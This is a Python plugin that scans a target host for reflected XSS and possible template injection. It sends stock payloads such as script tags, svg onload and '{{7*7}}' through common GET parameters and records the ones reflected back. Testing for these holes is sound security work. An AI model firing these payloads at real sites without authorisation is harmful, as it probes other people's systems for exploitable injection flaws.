# plugins/xss_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner de XSS Refletido (Reflected XSS) via GET.
    Envia payloads em parâmetros comuns e verifica reflexão na resposta.
    """
    import requests

    params = ["q", "search", "query", "s", "keyword", "id", "page", "name", "url", "input", "msg", "text"]
    payloads = [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '<svg onload=alert(1)>',
        '{{7*7}}',
        '${7*7}',
        '"><svg/onload=alert(1)//',
    ]
    vulns = []

    for param in params:
        for payload in payloads:
            url = f"http://{target}/?{param}={payload}"
            try:
                resp = requests.get(url, timeout=6, allow_redirects=True)
                # Verificar reflexão direta (não-encoded)
                if payload in resp.text:
                    vulns.append({
                        "tipo": "XSS_REFLETIDO",
                        "parametro": param,
                        "payload": payload,
                        "reflexao": True,
                        "status_http": resp.status_code,
                        "amostra": resp.text[resp.text.index(payload)-50:resp.text.index(payload)+80][:200],
                    })
                    break  # Um payload basta por param
                # Verificar template injection
                elif '{{7*7}}' in [payload] and '49' in resp.text:
                    vulns.append({
                        "tipo": "SSTI_POSSIVEL",
                        "parametro": param,
                        "payload": payload,
                        "status_http": resp.status_code,
                    })
            except requests.Timeout:
                continue
            except Exception:
                continue

    return {
        "plugin": "xss_scanner",
        "resultados": vulns if vulns else "Nenhum XSS refletido detectado nos parâmetros testados"
    }
